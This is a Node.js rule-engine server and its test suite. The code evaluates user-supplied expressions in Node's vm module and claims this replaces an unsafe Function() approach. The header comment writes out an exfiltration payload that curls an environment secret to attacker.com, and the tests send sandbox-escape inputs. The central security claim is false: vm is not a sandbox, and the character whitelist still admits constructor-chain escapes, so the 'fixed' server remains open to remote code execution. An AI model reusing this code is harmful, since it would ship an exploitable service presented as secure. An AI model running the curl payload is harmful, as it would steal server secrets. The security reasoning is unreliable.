/**
 * app.js — acme-rules Dynamic Rule Engine
 *
 * POST /check
 *   Body: { "rule": "<expression>", "context": { ...vars } }
 *   Returns: { "result": <boolean>, "rule": "<expression>" }
 *
 * Security note
 * -------------
 * docs/RULES_ENGINE.md suggests evaluating rule expressions with:
 *
 *   Function('ctx', 'req', `return (${expr});`)(ctx.ctx, req)
 *
 * This is a critical Remote Code Execution (RCE) vulnerability.
 * new Function() / eval() in Node.js is NOT sandboxed: a caller can
 * supply a rule such as:
 *
 *   require('child_process').execSync('curl attacker.com/?k=' + process.env.SECRET)
 *
 * and gain full access to the file-system, network, child processes,
 * and environment variables of the running server process.
 *
 * The implementation below uses Node's built-in `vm` module instead.
 * `vm.runInNewContext` executes code in a frozen, isolated V8 context
 * whose global object contains only the explicit `ctx` object we
 * supply — `require`, `process`, `global`, `__dirname`, Buffer, etc.
 * are simply absent.  A 50 ms timeout prevents infinite-loop DoS.
 */

'use strict';

const http    = require('http');
const vm      = require('vm');

// ---------------------------------------------------------------------------
// Rule evaluator — safe, sandboxed, zero external dependencies
// ---------------------------------------------------------------------------

/**
 * Allowable expression characters (whitelist).
 *
 * We permit: word chars, whitespace, digits, dots (property access), common
 * operators, brackets, quotes and underscores.  This rejects backticks,
 * semicolons, braces that would open block statements, etc.
 *
 * This is a defence-in-depth layer on top of the vm sandbox.
 */
const SAFE_EXPR = /^[a-zA-Z0-9_$\s\.\[\]'"()+\-*/%<>=!&|?,:#]+$/;

const EVAL_TIMEOUT_MS = 50; // prevent infinite-loop DoS

/**
 * Evaluates a rule expression against a context object.
 *
 * @param {string} expr   - Caller-supplied expression, e.g. "ctx.amount > 100"
 * @param {object} ctx    - The context variables exposed to the expression.
 * @returns {boolean}     - Result of the expression, coerced to boolean.
 * @throws                - On syntax errors, disallowed characters, or timeouts.
 */
function evalRule(expr, ctx) {
  if (typeof expr !== 'string' || expr.trim() === '') {
    throw new TypeError('rule must be a non-empty string');
  }

  if (!SAFE_EXPR.test(expr)) {
    throw new RangeError('rule contains disallowed characters');
  }

  // Build a completely empty sandbox — none of Node's globals leak in.
  const sandbox = Object.freeze({ ctx: ctx ?? {} });

  const result = vm.runInNewContext(
    `(${expr})`,     // wrap in parens so it is treated as an expression
    sandbox,
    {
      filename:       'rule',
      timeout:        EVAL_TIMEOUT_MS,
      displayErrors:  false,
    }
  );

  return Boolean(result);
}

// ---------------------------------------------------------------------------
// Minimal HTTP server (swap for express when dependencies are available)
// ---------------------------------------------------------------------------

/**
 * Reads the full request body and resolves with the parsed JSON object.
 * Rejects on body-too-large (> 64 KB), read errors, or JSON parse failures.
 */
function readJSON(req) {
  const MAX_BYTES = 65_536;

  return new Promise((resolve, reject) => {
    const chunks = [];
    let total    = 0;

    req.on('data', chunk => {
      total += chunk.length;
      if (total > MAX_BYTES) {
        req.destroy();
        return reject(Object.assign(new Error('Request body too large'), { status: 413 }));
      }
      chunks.push(chunk);
    });

    req.on('error', reject);

    req.on('end', () => {
      try {
        resolve(JSON.parse(Buffer.concat(chunks).toString('utf8')));
      } catch {
        reject(Object.assign(new Error('Invalid JSON'), { status: 400 }));
      }
    });
  });
}

/** Sends a JSON response. */
function sendJSON(res, status, body) {
  const payload = JSON.stringify(body);
  res.writeHead(status, {
    'Content-Type':   'application/json',
    'Content-Length': Buffer.byteLength(payload),
  });
  res.end(payload);
}

// ---------------------------------------------------------------------------
// Request handler
// ---------------------------------------------------------------------------

async function handler(req, res) {
  const { method, url } = req;

  // ── POST /check ──────────────────────────────────────────────────────────
  if (method === 'POST' && url === '/check') {
    let body;

    // 1. Parse request body
    try {
      body = await readJSON(req);
    } catch (err) {
      return sendJSON(res, err.status ?? 400, { error: err.message });
    }

    const { rule, context } = body;

    // 2. Validate inputs
    if (typeof rule !== 'string' || rule.trim() === '') {
      return sendJSON(res, 400, {
        error: '`rule` is required and must be a non-empty string',
      });
    }

    if (context !== undefined && (typeof context !== 'object' || Array.isArray(context))) {
      return sendJSON(res, 400, {
        error: '`context` must be a plain object when provided',
      });
    }

    // 3. Evaluate rule
    let result;
    try {
      result = evalRule(rule, context);
    } catch (err) {
      // Surface rule errors as 422 Unprocessable Entity so callers can
      // distinguish a bad rule from a server fault (500).
      const isClientError =
        err instanceof TypeError   ||
        err instanceof RangeError  ||
        err instanceof SyntaxError ||
        err.code === 'ERR_SCRIPT_EXECUTION_TIMEOUT';

      if (isClientError) {
        return sendJSON(res, 422, { error: `Rule evaluation failed: ${err.message}` });
      }
      // Unexpected server-side error — don't leak internals.
      console.error('Unexpected evalRule error:', err);
      return sendJSON(res, 500, { error: 'Internal server error' });
    }

    // 4. Respond
    return sendJSON(res, 200, { result, rule });
  }

  // ── 404 for everything else ───────────────────────────────────────────────
  sendJSON(res, 404, { error: 'Not found' });
}

// ---------------------------------------------------------------------------
// Bootstrap
// ---------------------------------------------------------------------------

const PORT = process.env.PORT ?? 3000;

const server = http.createServer((req, res) => {
  handler(req, res).catch(err => {
    console.error('Unhandled handler error:', err);
    if (!res.headersSent) {
      sendJSON(res, 500, { error: 'Internal server error' });
    }
  });
});

server.listen(PORT, () => {
  console.log(`acme-rules listening on http://localhost:${PORT}`);
});

module.exports = { server, evalRule }; // export for testing

/**
 * app.test.js — test suite for POST /check
 *
 * Run with:  node app.test.js
 *
 * Uses only Node built-ins (http + assert) so no test-runner is needed.
 */

'use strict';

const http   = require('http');
const assert = require('assert/strict');

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

let server;
let baseURL;

/** POST /check with the given body, returns { status, body }. */
function post(payload) {
  return new Promise((resolve, reject) => {
    const raw = JSON.stringify(payload);
    const opts = {
      ...new URL('/check', baseURL),
      method:  'POST',
      headers: {
        'Content-Type':   'application/json',
        'Content-Length': Buffer.byteLength(raw),
      },
    };
    const req = http.request(opts, res => {
      const chunks = [];
      res.on('data', c => chunks.push(c));
      res.on('end', () => {
        try {
          resolve({ status: res.statusCode, body: JSON.parse(Buffer.concat(chunks).toString()) });
        } catch (e) {
          reject(e);
        }
      });
    });
    req.on('error', reject);
    req.end(raw);
  });
}

// ---------------------------------------------------------------------------
// Test runner
// ---------------------------------------------------------------------------

let passed = 0;
let failed = 0;

async function test(name, fn) {
  try {
    await fn();
    console.log(`  ✓  ${name}`);
    passed++;
  } catch (err) {
    console.error(`  ✗  ${name}`);
    console.error(`       ${err.message}`);
    failed++;
  }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

async function runTests() {
  // ── Happy-path: rule evaluates to true ──────────────────────────────────

  await test('returns result:true when rule is satisfied', async () => {
    const { status, body } = await post({
      rule:    'ctx.amount > 100',
      context: { amount: 150 },
    });
    assert.equal(status, 200);
    assert.equal(body.result, true);
    assert.equal(body.rule,   'ctx.amount > 100');
  });

  await test('returns result:false when rule is not satisfied', async () => {
    const { status, body } = await post({
      rule:    'ctx.amount > 100',
      context: { amount: 50 },
    });
    assert.equal(status, 200);
    assert.equal(body.result, false);
  });

  // ── Various expression types ─────────────────────────────────────────────

  await test('equality check', async () => {
    const { status, body } = await post({
      rule:    'ctx.role === "admin"',
      context: { role: 'admin' },
    });
    assert.equal(status, 200);
    assert.equal(body.result, true);
  });

  await test('logical AND across two fields', async () => {
    const { status, body } = await post({
      rule:    'ctx.age >= 18 && ctx.country === "US"',
      context: { age: 21, country: 'US' },
    });
    assert.equal(status, 200);
    assert.equal(body.result, true);
  });

  await test('logical AND — false branch', async () => {
    const { status, body } = await post({
      rule:    'ctx.age >= 18 && ctx.country === "US"',
      context: { age: 16, country: 'US' },
    });
    assert.equal(status, 200);
    assert.equal(body.result, false);
  });

  await test('logical OR', async () => {
    const { status, body } = await post({
      rule:    'ctx.score > 90 || ctx.bonus === true',
      context: { score: 70, bonus: true },
    });
    assert.equal(status, 200);
    assert.equal(body.result, true);
  });

  await test('arithmetic in rule', async () => {
    const { status, body } = await post({
      rule:    'ctx.price * ctx.qty > 500',
      context: { price: 60, qty: 10 },
    });
    assert.equal(status, 200);
    assert.equal(body.result, true);
  });

  await test('ternary / truthy coercion', async () => {
    const { status, body } = await post({
      rule:    'ctx.active ? ctx.level > 2 : false',
      context: { active: true, level: 5 },
    });
    assert.equal(status, 200);
    assert.equal(body.result, true);
  });

  await test('context-less rule (no context key in body)', async () => {
    const { status, body } = await post({ rule: '1 === 1' });
    assert.equal(status, 200);
    assert.equal(body.result, true);
  });

  await test('empty context object is allowed', async () => {
    const { status, body } = await post({ rule: '1 + 1 === 2', context: {} });
    assert.equal(status, 200);
    assert.equal(body.result, true);
  });

  await test('response includes the original rule string', async () => {
    const rule = 'ctx.x !== ctx.y';
    const { body } = await post({ rule, context: { x: 1, y: 2 } });
    assert.equal(body.rule, rule);
  });

  // ── Input validation — 400 ───────────────────────────────────────────────

  await test('400 when rule is missing', async () => {
    const { status, body } = await post({ context: { amount: 10 } });
    assert.equal(status, 400);
    assert.ok(body.error);
  });

  await test('400 when rule is empty string', async () => {
    const { status, body } = await post({ rule: '', context: {} });
    assert.equal(status, 400);
    assert.ok(body.error);
  });

  await test('400 when rule is not a string (number)', async () => {
    const { status, body } = await post({ rule: 42 });
    assert.equal(status, 400);
    assert.ok(body.error);
  });

  await test('400 when context is an array', async () => {
    const { status, body } = await post({ rule: '1===1', context: [1, 2] });
    assert.equal(status, 400);
    assert.ok(body.error);
  });

  await test('400 when body is not JSON', async () => {
    const { status, body } = await new Promise((resolve, reject) => {
      const raw = 'not-json';
      const req = http.request({
        ...new URL('/check', baseURL),
        method:  'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(raw) },
      }, res => {
        const chunks = [];
        res.on('data', c => chunks.push(c));
        res.on('end', () => resolve({ status: res.statusCode, body: JSON.parse(Buffer.concat(chunks).toString()) }));
      });
      req.on('error', reject);
      req.end(raw);
    });
    assert.equal(status, 400);
    assert.ok(body.error);
  });

  // ── Rule errors — 422 ────────────────────────────────────────────────────

  await test('422 when rule has a syntax error', async () => {
    const { status, body } = await post({ rule: 'ctx.amount >', context: { amount: 5 } });
    assert.equal(status, 422);
    assert.ok(body.error.startsWith('Rule evaluation failed'));
  });

  await test('422 when rule references an undefined variable (throws in strict mode)', async () => {
    // undeclared identifiers in a bare vm context throw ReferenceError
    const { status } = await post({ rule: 'undeclaredVar > 0', context: {} });
    assert.equal(status, 422);
  });

  // ── Security: sandbox escape attempts must be blocked ───────────────────

  await test('SECURITY: rule cannot access process object', async () => {
    const { status, body } = await post({
      rule:    'typeof process === "undefined"',
      context: {},
    });
    // process is absent from the sandbox → expression returns true
    assert.equal(status, 200);
    assert.equal(body.result, true);
  });

  await test('SECURITY: rule cannot access require', async () => {
    const { status, body } = await post({
      rule:    'typeof require === "undefined"',
      context: {},
    });
    assert.equal(status, 200);
    assert.equal(body.result, true);
  });

  await test('SECURITY: rule cannot access global', async () => {
    const { status, body } = await post({
      rule:    'typeof global === "undefined"',
      context: {},
    });
    assert.equal(status, 200);
    assert.equal(body.result, true);
  });

  await test('SECURITY: disallowed characters (backtick) → 422', async () => {
    const { status } = await post({ rule: '`hello`', context: {} });
    assert.equal(status, 422);
  });

  await test('SECURITY: disallowed characters (semicolon chain) → 422', async () => {
    const { status } = await post({ rule: '1; require("fs")', context: {} });
    assert.equal(status, 422);
  });

  await test('SECURITY: disallowed characters (curly brace) → 422', async () => {
    const { status } = await post({ rule: '(() => { return 1 })()', context: {} });
    assert.equal(status, 422);
  });

  await test('SECURITY: RCE via require("child_process") → 422', async () => {
    const { status } = await post({
      rule:    'typeof require("child_process").execSync',
      context: {},
    });
    assert.equal(status, 422);
  });

  // ── 404 for unknown routes ───────────────────────────────────────────────

  await test('404 for GET /check', async () => {
    const { status } = await new Promise((resolve, reject) => {
      const req = http.request({ ...new URL('/check', baseURL), method: 'GET' }, res => {
        const chunks = [];
        res.on('data', c => chunks.push(c));
        res.on('end', () => resolve({ status: res.statusCode }));
      });
      req.on('error', reject);
      req.end();
    });
    assert.equal(status, 404);
  });

  await test('404 for unknown path', async () => {
    const { status } = await new Promise((resolve, reject) => {
      const req = http.request({ ...new URL('/unknown', baseURL), method: 'POST' }, res => {
        const chunks = [];
        res.on('data', c => chunks.push(c));
        res.on('end', () => resolve({ status: res.statusCode }));
      });
      req.on('error', reject);
      req.end('{}');
    });
    assert.equal(status, 404);
  });
}

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------

(async () => {
  // Start server on a random port to avoid conflicts
  ({ server } = require('./app'));
  await new Promise(resolve => {
    if (server.listening) return resolve();
    server.once('listening', resolve);
  });

  const { port } = server.address();
  baseURL = `http://localhost:${port}`;

  console.log(`\nRunning tests against ${baseURL}\n`);

  await runTests();

  console.log(`\n${passed + failed} tests: ${passed} passed, ${failed} failed\n`);

  server.close(() => process.exit(failed > 0 ? 1 : 0));
})();

